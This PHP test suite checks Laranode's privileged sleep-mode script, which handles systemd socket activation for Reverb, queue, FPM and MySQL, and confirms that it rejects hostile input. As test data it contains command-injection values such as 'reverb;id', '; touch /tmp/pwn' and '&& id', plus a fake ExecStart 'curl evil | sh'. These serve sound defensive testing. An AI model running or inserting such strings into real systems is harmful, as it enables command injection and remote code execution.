<?php

/**
 * Unit-level proof of the ONE privileged script: laranode-sleep.sh.
 *
 * Runs the real bash script against a stub `systemctl` on PATH and throw-away
 * registry/systemd/php dirs (overrides are honoured only with LARANODE_SLEEP_TEST=1
 * and no SUDO_UID, so they can never be smuggled in through sudo). No root needed.
 * Real-systemd behaviour is proven separately by tests/system/sleep/matrix.sh.
 */

require_once __DIR__.'/../../Support/sleep-helpers.php';

if (PHP_OS_FAMILY === 'Windows') {
    return;
}

afterEach(function () {
    if (isset($this->sbx)) {
        exec('rm -rf '.escapeshellarg($this->sbx['root']));
    }
});

// ─── argument validation: refuse before touching anything ─────────────────

test('no arguments is a usage error', function () {
    $this->sbx = sleepSandbox();
    $r = runSleep($this->sbx, []);
    expect($r['code'])->toBe(2)->and($r['calls'])->toBe('');
});

test('unknown keys are refused: no unit name is ever accepted as an argument', function () {
    $this->sbx = sleepSandbox();
    foreach (['postgresql', 'postgresql@16-main', 'mysql', 'redis', 'apache2', 'sshd', 'reverb;id', '--help', '../x', 'laranode-reverb.service'] as $key) {
        $r = runSleep($this->sbx, [$key, 'enable', '10']);
        expect($r['code'])->toBe(2, "key {$key}")->and($r['calls'])->toBe('');
    }
});

test('unknown actions are refused', function () {
    $this->sbx = sleepSandbox();
    sleepRegister($this->sbx, 'reverb', ['kind' => 'reverb', 'unit' => 'laranode-reverb.service', 'public_port' => '8080']);
    foreach (['restart', 'start', 'stop', '--now', 'enable;id', ''] as $act) {
        $r = runSleep($this->sbx, ['reverb', $act, '10']);
        expect($r['code'])->toBe(2, "action {$act}");
    }
});

test('idle minutes must be an integer 1..1440', function () {
    $this->sbx = sleepSandbox();
    sleepRegister($this->sbx, 'reverb', ['kind' => 'reverb', 'unit' => 'laranode-reverb.service', 'public_port' => '8080']);
    sleepUnit($this->sbx, 'laranode-reverb.service', '/usr/bin/php /home/laranode_ln/panel/artisan reverb:start');
    foreach (['0', '1441', 'abc', '-5', '5;id', '1.5', '', '010x', '99999999999'] as $idle) {
        $r = runSleep($this->sbx, ['reverb', 'enable', $idle]);
        expect($r['code'])->toBe(2, "idle '{$idle}'")->and($r['calls'])->toBe('');
    }
});

test('refuses to run as a normal user outside test mode', function () {
    if (function_exists('posix_geteuid') && posix_geteuid() === 0) {
        $this->markTestSkipped('running as root');
    }
    $this->sbx = sleepSandbox();
    $r = runSleep($this->sbx, ['reverb', 'wake'], ['LARANODE_SLEEP_TEST' => '']);
    expect($r['code'])->toBe(4);
});

test('overrides are ignored under sudo (SUDO_UID set): cannot be smuggled in', function () {
    if (function_exists('posix_geteuid') && posix_geteuid() === 0) {
        $this->markTestSkipped('running as root: the not-privileged exit (4) is unreachable');
    }
    $this->sbx = sleepSandbox();
    // A fully working, ENABLED setup: if the test-mode overrides leaked through sudo the
    // script would happily act on it (stop the unit, exit 0). Exactly exit 4, no calls.
    reverbSetup($this->sbx);
    expect(runSleep($this->sbx, ['reverb', 'enable', '10'])['code'])->toBe(0);
    file_put_contents("{$this->sbx['root']}/calls.log", '');
    foreach (['wake', 'sleep', 'disable'] as $action) {
        $r = runSleep($this->sbx, ['reverb', $action], ['SUDO_UID' => '33']);
        expect($r['code'])->toBe(4, "reverb {$action}: ".$r['all'])->and($r['calls'])->toBe('');
    }
    // the sandboxed state is untouched
    expect(file_exists("{$this->sbx['root']}/managed/sleep/reverb.state"))->toBeTrue();
});

// ─── registry gate: only what Laranode registered, never anything pre-existing ───

test('empty/missing registry refuses every key', function () {
    $this->sbx = sleepSandbox();
    foreach (['reverb', 'queue', 'hostdb', 'fpm'] as $k) {
        $r = runSleep($this->sbx, [$k, 'enable', '10']);
        expect($r['code'])->toBe(3, $k)->and($r['all'])->toContain('not managed')->and($r['calls'])->toBe('');
    }
});

test('a pre-existing service cannot be slept even if someone writes it into the registry', function () {
    $this->sbx = sleepSandbox();
    // a tampered/mistaken registry claiming DS's PostgreSQL 16 or redis as "ours"
    sleepRegister($this->sbx, 'hostdb', ['kind' => 'db', 'engine' => 'postgres', 'unit' => 'postgresql@16-main.service', 'public_port' => '5432', 'public_socket' => '/var/run/postgresql/.s.PGSQL.5432', 'cnf_dir' => '/etc/postgresql']);
    sleepRegister($this->sbx, 'reverb', ['kind' => 'reverb', 'unit' => 'redis-server.service', 'public_port' => '6379']);
    sleepRegister($this->sbx, 'queue', ['kind' => 'queue', 'unit' => 'nginx.service']);
    foreach ([['hostdb', 'enable', '10'], ['hostdb', 'wake'], ['reverb', 'enable', '10'], ['reverb', 'sleep'], ['queue', 'enable'], ['queue', 'wake']] as $args) {
        $r = runSleep($this->sbx, $args);
        expect($r['code'])->toBe(3, implode(' ', $args))->and($r['calls'])->not->toContain('redis-server')->not->toContain('postgresql@16-main')->not->toContain('nginx');
    }
});

test('registry values with shell metacharacters are rejected', function () {
    $this->sbx = sleepSandbox();
    sleepRegister($this->sbx, 'reverb', ['kind' => 'reverb', 'unit' => 'laranode-reverb.service; touch /tmp/pwn', 'public_port' => '8080']);
    $r = runSleep($this->sbx, ['reverb', 'enable', '10']);
    expect($r['code'])->toBe(3);
    sleepRegister($this->sbx, 'reverb', ['kind' => 'reverb', 'unit' => 'laranode-reverb.service', 'public_port' => '8080 && id']);
    expect(runSleep($this->sbx, ['reverb', 'enable', '10'])['code'])->toBe(3);
});

test('hostdb refuses when the panel DB is the same local instance', function () {
    $this->sbx = sleepSandbox();
    sleepRegister($this->sbx, 'hostdb', ['kind' => 'db', 'engine' => 'mysql', 'unit' => 'mysql.service', 'public_port' => '3306', 'public_socket' => '/var/run/mysqld/mysqld.sock', 'cnf_dir' => "{$this->sbx['root']}/mysqlconf", 'panel_env' => "{$this->sbx['root']}/panel/.env"]);
    sleepUnit($this->sbx, 'mysql.service', '/usr/sbin/mysqld');
    file_put_contents("{$this->sbx['root']}/panel/.env", "APP_NAME=x\nDB_CONNECTION=mysql\nDB_HOST=127.0.0.1\nDB_PORT=3306\n");
    foreach ([['hostdb', 'enable', '10'], ['hostdb', 'sleep']] as $args) {
        $r = runSleep($this->sbx, $args);
        expect($r['code'])->toBe(3)->and($r['all'])->toContain('panel')->and($r['calls'])->not->toContain('stop');
    }
});

test('hostdb with a postgres engine is refused as unsupported', function () {
    $this->sbx = sleepSandbox();
    sleepRegister($this->sbx, 'hostdb', ['kind' => 'db', 'engine' => 'postgres', 'unit' => 'mysql.service', 'public_port' => '5432']);
    $r = runSleep($this->sbx, ['hostdb', 'enable', '10']);
    expect($r['code'])->toBe(3)->and($r['all'])->toContain('unsupported');
});

test('reverb with an unexpected ExecStart is refused rather than rewritten', function () {
    $this->sbx = sleepSandbox();
    sleepRegister($this->sbx, 'reverb', ['kind' => 'reverb', 'unit' => 'laranode-reverb.service', 'public_port' => '8080']);
    sleepUnit($this->sbx, 'laranode-reverb.service', '/bin/sh -c "curl evil | sh"');
    $r = runSleep($this->sbx, ['reverb', 'enable', '10']);
    expect($r['code'])->toBe(3)->and(file_exists("{$this->sbx['root']}/systemd/laranode-sleep-reverb.socket"))->toBeFalse();
});

// ─── reverb: toggle on / off ─────────────────────────────────────────────

function reverbSetup(array $sbx): void
{
    sleepRegister($sbx, 'reverb', ['kind' => 'reverb', 'unit' => 'laranode-reverb.service', 'public_port' => '8080']);
    sleepUnit($sbx, 'laranode-reverb.service', '/usr/bin/php /home/laranode_ln/panel/artisan reverb:start');
    touch("{$sbx['root']}/enabled/laranode-reverb.service");
    touch("{$sbx['root']}/active/laranode-reverb.service");
}

test('toggle off (never enabled) leaves systemd dir untouched', function () {
    $this->sbx = sleepSandbox();
    reverbSetup($this->sbx);
    expect(glob("{$this->sbx['root']}/systemd/*"))->toBe([])->and(runSleep($this->sbx, ['reverb', 'disable'])['code'])->toBe(0);
    expect(glob("{$this->sbx['root']}/systemd/*"))->toBe([]);
});

test('reverb enable: socket owns the public port, backend moves loopback, units stop-when-unneeded', function () {
    $this->sbx = sleepSandbox();
    reverbSetup($this->sbx);
    $r = runSleep($this->sbx, ['reverb', 'enable', '10']);
    expect($r['code'])->toBe(0, $r['all']);

    $sd = "{$this->sbx['root']}/systemd";
    $sock = file_get_contents("{$sd}/laranode-sleep-reverb.socket");
    $svc = file_get_contents("{$sd}/laranode-sleep-reverb.service");
    $drop = file_get_contents("{$sd}/laranode-reverb.service.d/laranode-sleep.conf");
    expect($sock)->toContain('ListenStream=0.0.0.0:8080')->and($sock)->not->toMatch('/^ListenStream=8080$/m')
        ->and($svc)->toContain('systemd-socket-proxyd --exit-idle-time=10min 127.0.0.1:')
        ->and($svc)->toContain('Requires=laranode-reverb.service')
        ->and($drop)->toContain('StopWhenUnneeded=yes')
        ->and($drop)->toContain('reverb:start --host=127.0.0.1 --port=')
        ->and($drop)->toContain('ExecStartPost=');
    $state = file_get_contents("{$this->sbx['root']}/managed/sleep/reverb.state");
    expect($state)->toContain('enabled=1')->and($state)->toContain('idle_minutes=10')->and($state)->toContain('was_enabled=yes');
    // real unit no longer wanted at boot; the socket is
    expect($r['calls'])->toContain('disable laranode-reverb.service')->and($r['calls'])->toContain('enable --now laranode-sleep-reverb.socket');
});

test('reverb socket listens ONLY where Reverb itself listens (loopback stays loopback)', function () {
    $this->sbx = sleepSandbox();
    reverbSetup($this->sbx);
    sleepRegister($this->sbx, 'reverb', ['kind' => 'reverb', 'unit' => 'laranode-reverb.service', 'public_port' => '8081', 'bind_host' => '127.0.0.1']);
    $r = runSleep($this->sbx, ['reverb', 'enable', '10']);
    expect($r['code'])->toBe(0, $r['all']);
    $sock = file_get_contents("{$this->sbx['root']}/systemd/laranode-sleep-reverb.socket");
    expect($sock)->toMatch('/^ListenStream=127\.0\.0\.1:8081$/m')
        ->and($sock)->not->toMatch('/^ListenStream=(0\.0\.0\.0:|\[::\]:)?8081$/m');
});

test('reverb enable is refused when the registry has no valid bind_host (fail closed, never widen)', function () {
    $this->sbx = sleepSandbox();
    reverbSetup($this->sbx);
    foreach ([null, '', '::', '[::]', 'example.com', '300.1.1.1', '1.2.3.4;id', '127.0.0.1 && id'] as $bad) {
        sleepRegister($this->sbx, 'reverb', ['kind' => 'reverb', 'unit' => 'laranode-reverb.service', 'public_port' => '8080', 'bind_host' => $bad]);
        $r = runSleep($this->sbx, ['reverb', 'enable', '10']);
        expect($r['code'])->toBe(3, 'bind_host='.var_export($bad, true).' '.$r['all'])
            ->and(file_exists("{$this->sbx['root']}/systemd/laranode-sleep-reverb.socket"))->toBeFalse();
    }
});

test('reverb enable is idempotent and updates idle minutes', function () {
    $this->sbx = sleepSandbox();
    reverbSetup($this->sbx);
    runSleep($this->sbx, ['reverb', 'enable', '10']);
    $r = runSleep($this->sbx, ['reverb', 'enable', '30']);
    expect($r['code'])->toBe(0)
        ->and(file_get_contents("{$this->sbx['root']}/systemd/laranode-sleep-reverb.service"))->toContain('--exit-idle-time=30min')
        ->and(file_get_contents("{$this->sbx['root']}/managed/sleep/reverb.state"))->toContain('was_enabled=yes');
});

test('reverb disable restores the pre-sleep state exactly', function () {
    $this->sbx = sleepSandbox();
    reverbSetup($this->sbx);
    runSleep($this->sbx, ['reverb', 'enable', '10']);
    $r = runSleep($this->sbx, ['reverb', 'disable']);
    expect($r['code'])->toBe(0, $r['all'])
        ->and(glob("{$this->sbx['root']}/systemd/*"))->toBe([])
        ->and(file_exists("{$this->sbx['root']}/enabled/laranode-reverb.service"))->toBeTrue()
        ->and(file_exists("{$this->sbx['root']}/managed/sleep/reverb.state"))->toBeFalse()
        ->and($r['calls'])->toContain('enable laranode-reverb.service')->and($r['calls'])->toContain('start laranode-reverb.service');
});

test('wake on a sleep-disabled key is refused (nothing to wake)', function () {
    $this->sbx = sleepSandbox();
    reverbSetup($this->sbx);
    expect(runSleep($this->sbx, ['reverb', 'wake'])['code'])->toBe(3);
});

// ─── queue ───────────────────────────────────────────────────────────────

test('queue enable installs a 30s timer + stop-when-empty drop-in; disable removes all', function () {
    $this->sbx = sleepSandbox();
    sleepRegister($this->sbx, 'queue', ['kind' => 'queue', 'unit' => 'laranode-queue-worker.service']);
    sleepUnit($this->sbx, 'laranode-queue-worker.service', '/usr/bin/php /home/laranode_ln/panel/artisan queue:work');
    touch("{$this->sbx['root']}/enabled/laranode-queue-worker.service");

    $r = runSleep($this->sbx, ['queue', 'enable']);
    $sd = "{$this->sbx['root']}/systemd";
    expect($r['code'])->toBe(0, $r['all'])
        ->and(file_get_contents("{$sd}/laranode-sleep-queue.timer"))->toContain('OnUnitInactiveSec=30s')
        ->and(file_get_contents("{$sd}/laranode-queue-worker.service.d/laranode-sleep.conf"))->toContain('queue:work --stop-when-empty --max-time=')
        ->and($r['calls'])->toContain('disable laranode-queue-worker.service');

    $r = runSleep($this->sbx, ['queue', 'disable']);
    expect($r['code'])->toBe(0)->and(glob("{$sd}/*"))->toBe([])
        ->and(file_exists("{$this->sbx['root']}/enabled/laranode-queue-worker.service"))->toBeTrue();
});

test('queue wake starts the worker without blocking; refused when sleep is off', function () {
    $this->sbx = sleepSandbox();
    sleepRegister($this->sbx, 'queue', ['kind' => 'queue', 'unit' => 'laranode-queue-worker.service']);
    sleepUnit($this->sbx, 'laranode-queue-worker.service', '/usr/bin/php /home/laranode_ln/panel/artisan queue:work');
    expect(runSleep($this->sbx, ['queue', 'wake'])['code'])->toBe(3);
    runSleep($this->sbx, ['queue', 'enable']);
    $r = runSleep($this->sbx, ['queue', 'wake']);
    expect($r['code'])->toBe(0)->and($r['calls'])->toContain('start --no-block laranode-queue-worker.service');
});

// ─── fpm: only *_ln.conf, byte-exact restore ─────────────────────────────

test('fpm enable converts only laranode pools; disable restores them byte-for-byte', function () {
    $this->sbx = sleepSandbox();
    sleepRegister($this->sbx, 'fpm', ['kind' => 'fpm']);
    $pd = "{$this->sbx['root']}/php/8.4/fpm/pool.d";
    mkdir($pd, 0755, true);
    $ours = "[alice_ln]\nuser = alice_ln\npm = dynamic\npm.max_children = 5\npm.start_servers = 2\n";
    $foreign = "[www]\nuser = www-data\npm = dynamic\npm.max_children = 20\n";
    file_put_contents("{$pd}/alice_ln.conf", $ours);
    file_put_contents("{$pd}/www.conf", $foreign);
    file_put_contents("{$pd}/clouddeploy.conf", $foreign);
    $hashes = fn () => array_map('md5_file', glob("{$pd}/*.conf"));
    $before = $hashes();

    $r = runSleep($this->sbx, ['fpm', 'enable', '2']);
    expect($r['code'])->toBe(0, $r['all']);
    $after = file_get_contents("{$pd}/alice_ln.conf");
    expect($after)->toContain('pm = ondemand')->and($after)->toContain('pm.process_idle_timeout = 2m')
        ->and(file_get_contents("{$pd}/www.conf"))->toBe($foreign)
        ->and(file_get_contents("{$pd}/clouddeploy.conf"))->toBe($foreign)
        ->and($r['calls'])->toContain('reload php8.4-fpm');

    $r = runSleep($this->sbx, ['fpm', 'disable']);
    expect($r['code'])->toBe(0)->and($hashes())->toBe($before);
});

test('fpm enable twice does not duplicate the idle-timeout line', function () {
    $this->sbx = sleepSandbox();
    sleepRegister($this->sbx, 'fpm', ['kind' => 'fpm']);
    $pd = "{$this->sbx['root']}/php/8.4/fpm/pool.d";
    mkdir($pd, 0755, true);
    file_put_contents("{$pd}/bob_ln.conf", "[bob_ln]\npm = dynamic\n");
    runSleep($this->sbx, ['fpm', 'enable', '1']);
    runSleep($this->sbx, ['fpm', 'enable', '3']);
    $c = file_get_contents("{$pd}/bob_ln.conf");
    expect(substr_count($c, 'pm.process_idle_timeout'))->toBe(1)->and($c)->toContain('pm.process_idle_timeout = 3m');
});

// ─── hostdb (mysql/mariadb) ──────────────────────────────────────────────

function hostdbSetup(array $sbx): void
{
    $conf = "{$sbx['root']}/mysqlconf";
    mkdir($conf, 0755, true);
    sleepRegister($sbx, 'hostdb', ['kind' => 'db', 'engine' => 'mysql', 'unit' => 'mysql.service', 'public_port' => '3306', 'public_socket' => '/var/run/mysqld/mysqld.sock', 'cnf_dir' => $conf, 'panel_env' => "{$sbx['root']}/panel/.env"]);
    sleepUnit($sbx, 'mysql.service', '/usr/sbin/mysqld');
    file_put_contents("{$sbx['root']}/panel/.env", "DB_CONNECTION=sqlite\n");
    touch("{$sbx['root']}/enabled/mysql.service");
    touch("{$sbx['root']}/active/mysql.service");
}

test('hostdb enable: proxy socket owns TCP port AND the canonical unix socket; backend private, no TCP', function () {
    $this->sbx = sleepSandbox();
    hostdbSetup($this->sbx);
    $r = runSleep($this->sbx, ['hostdb', 'enable', '15']);
    expect($r['code'])->toBe(0, $r['all']);
    $sd = "{$this->sbx['root']}/systemd";
    $sock = file_get_contents("{$sd}/laranode-sleep-hostdb.socket");
    $svc = file_get_contents("{$sd}/laranode-sleep-hostdb.service");
    $drop = file_get_contents("{$sd}/mysql.service.d/laranode-sleep.conf");
    $cnf = file_get_contents("{$this->sbx['root']}/mysqlconf/zz-laranode-sleep.cnf");
    expect($sock)->toContain('ListenStream=127.0.0.1:3306')->and($sock)->toContain('ListenStream=/var/run/mysqld/mysqld.sock')->and($sock)->toContain('SocketMode=0666')
        ->and($svc)->toContain('DynamicUser=yes')->and($svc)->toContain('--exit-idle-time=15min /run/laranode-hostdb/mysqld.sock')
        ->and($drop)->toContain('StopWhenUnneeded=yes')->and($drop)->toContain('RuntimeDirectory=laranode-hostdb')
        ->and($cnf)->toContain('skip-networking')->and($cnf)->toContain('socket=/run/laranode-hostdb/mysqld.sock');
});

test('hostdb disable removes every file and restores boot enablement', function () {
    $this->sbx = sleepSandbox();
    hostdbSetup($this->sbx);
    runSleep($this->sbx, ['hostdb', 'enable', '15']);
    $r = runSleep($this->sbx, ['hostdb', 'disable']);
    expect($r['code'])->toBe(0, $r['all'])->and(glob("{$this->sbx['root']}/systemd/*"))->toBe([])
        ->and(glob("{$this->sbx['root']}/mysqlconf/*"))->toBe([])
        ->and(file_exists("{$this->sbx['root']}/enabled/mysql.service"))->toBeTrue();
});

test('failed enable rolls back: no half-installed units left', function () {
    $this->sbx = sleepSandbox();
    hostdbSetup($this->sbx);
    // make `systemctl enable --now <socket>` fail
    $stub = file_get_contents("{$this->sbx['root']}/bin/systemctl");
    file_put_contents("{$this->sbx['root']}/bin/systemctl", str_replace('  enable)', "  enable) case \"\$*\" in *laranode-sleep-*) exit 1;; esac;;\n  enable_orig)", $stub));
    $r = runSleep($this->sbx, ['hostdb', 'enable', '15']);
    expect($r['code'])->not->toBe(0)->and(glob("{$this->sbx['root']}/systemd/*"))->toBe([])
        ->and(glob("{$this->sbx['root']}/mysqlconf/*"))->toBe([])
        ->and(file_exists("{$this->sbx['root']}/managed/sleep/hostdb.state"))->toBeFalse();
});

// ─── existing db-service script must not fight sleep mode ────────────────

test('laranode-db-service.sh refuses start/stop while hostdb sleep is enabled', function () {
    $this->sbx = sleepSandbox();
    file_put_contents("{$this->sbx['root']}/managed/sleep/hostdb.state", "enabled=1\n");
    $proc = proc_open(['bash', __DIR__.'/../../../laranode-scripts/bin/laranode-db-service.sh', 'start', 'mysql'], [1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes, null, [
        'SBX' => $this->sbx['root'], 'PATH' => "{$this->sbx['root']}/bin:".getenv('PATH'), 'LARANODE_SLEEP_TEST' => '1', 'LARANODE_MANAGED_DIR' => "{$this->sbx['root']}/managed",
    ]);
    $err = stream_get_contents($pipes[2]);
    $code = proc_close($proc);
    expect($code)->toBe(3)->and($err)->toContain('sleep')->and(@file_get_contents("{$this->sbx['root']}/calls.log") ?: '')->toBe('');
});

// Regression: the allowlist must accept the units the installer REALLY ships (php8.4, not bare php).
test('enable works against the shipped unit templates verbatim', function () {
    $this->sbx = sleepSandbox();
    foreach (['reverb' => 'laranode-reverb.service', 'queue' => 'laranode-queue-worker.service'] as $key => $unit) {
        $tpl = file_get_contents(__DIR__."/../../../laranode-scripts/templates/{$unit}");
        preg_match('/^ExecStart=(.+)$/m', $tpl, $m);
        sleepUnit($this->sbx, $unit, $m[1]);
        sleepRegister($this->sbx, $key, $key === 'reverb'
            ? ['kind' => 'reverb', 'unit' => $unit, 'public_port' => '8080']
            : ['kind' => 'queue', 'unit' => $unit]);
        $args = $key === 'reverb' ? [$key, 'enable', '10'] : [$key, 'enable'];
        $r = runSleep($this->sbx, $args);
        expect($r['code'])->toBe(0, "{$key}: {$m[1]} => ".$r['all']);
    }
});

// ─── hostdb vs AppArmor: refuse (never rewrite security policy) ───────────
// Ubuntu's mysqld AppArmor profile only allows /run/mysqld/mysqld.sock. Sleep mode moves the
// real server's socket to /run/laranode-hostdb/, so under an ENFORCED profile the database
// would fail to start on first wake. The script refuses up front instead.

function apparmorFiles(array $sbx, string $enabled, ?string $profiles): array
{
    $en = "{$sbx['root']}/aa-enabled";
    $pr = "{$sbx['root']}/aa-profiles";
    file_put_contents($en, $enabled."\n");
    if ($profiles === null) {
        @unlink($pr);
    } else {
        file_put_contents($pr, $profiles);
    }

    return ['LARANODE_AA_ENABLED' => $en, 'LARANODE_AA_PROFILES' => $pr];
}

test('hostdb enable is refused when an ENFORCED mysqld/mariadbd AppArmor profile is loaded', function () {
    foreach (["/usr/sbin/mysqld (enforce)\n", "mysqld (enforce)\n", "/usr/sbin/mariadbd (enforce)\n", "/usr/bin/man (enforce)\n/usr/sbin/mysqld (enforce)\nlsb_release (enforce)\n"] as $profiles) {
        $this->sbx = sleepSandbox();
        hostdbSetup($this->sbx);
        $env = apparmorFiles($this->sbx, 'Y', $profiles);
        $r = runSleep($this->sbx, ['hostdb', 'enable', '15'], $env);
        expect($r['code'])->toBe(3, trim($profiles).' => '.$r['all'])
            ->and($r['all'])->toContain('AppArmor')
            ->and($r['calls'])->toBe('')
            ->and(glob("{$this->sbx['root']}/systemd/*"))->toBe([])
            ->and(glob("{$this->sbx['root']}/mysqlconf/*"))->toBe([]);
        exec('rm -rf '.escapeshellarg($this->sbx['root']));
    }
});

test('hostdb enable still works when AppArmor is off, in complain mode, or has no mysqld profile', function () {
    $cases = [
        'AppArmor module off' => ['N', "/usr/sbin/mysqld (enforce)\n"],
        'complain mode (logs, never denies)' => ['Y', "/usr/sbin/mysqld (complain)\n"],
        'no database profile at all' => ['Y', "/usr/bin/man (enforce)\n/usr/sbin/mysqld//child (enforce)\n"],
    ];
    foreach ($cases as $why => [$enabled, $profiles]) {
        $this->sbx = sleepSandbox();
        hostdbSetup($this->sbx);
        $r = runSleep($this->sbx, ['hostdb', 'enable', '15'], apparmorFiles($this->sbx, $enabled, $profiles));
        expect($r['code'])->toBe(0, "{$why}: ".$r['all']);
        exec('rm -rf '.escapeshellarg($this->sbx['root']));
    }
});

test('AppArmor on but the profile list unreadable: hostdb enable fails closed', function () {
    $this->sbx = sleepSandbox();
    hostdbSetup($this->sbx);
    $r = runSleep($this->sbx, ['hostdb', 'enable', '15'], apparmorFiles($this->sbx, 'Y', null));
    expect($r['code'])->toBe(3, $r['all'])->and($r['all'])->toContain('AppArmor')->and($r['calls'])->toBe('');
});

test('hostdb wake is refused under an enforced profile (the DB could not start); disable still works', function () {
    $this->sbx = sleepSandbox();
    hostdbSetup($this->sbx);
    expect(runSleep($this->sbx, ['hostdb', 'enable', '15'], apparmorFiles($this->sbx, 'N', ''))['code'])->toBe(0);
    $env = apparmorFiles($this->sbx, 'Y', "/usr/sbin/mysqld (enforce)\n");
    $wake = runSleep($this->sbx, ['hostdb', 'wake'], $env);
    expect($wake['code'])->toBe(3, $wake['all'])->and($wake['all'])->toContain('AppArmor');
    // an admin can always turn sleep back off
    $off = runSleep($this->sbx, ['hostdb', 'disable'], $env);
    expect($off['code'])->toBe(0, $off['all'])->and(glob("{$this->sbx['root']}/systemd/*"))->toBe([]);
});

test('the real host AppArmor is ignored in test mode (only the injected files count)', function () {
    $this->sbx = sleepSandbox();
    hostdbSetup($this->sbx);
    // no LARANODE_AA_* given: must behave as "AppArmor absent", whatever this machine runs
    expect(runSleep($this->sbx, ['hostdb', 'enable', '15'])['code'])->toBe(0);
});
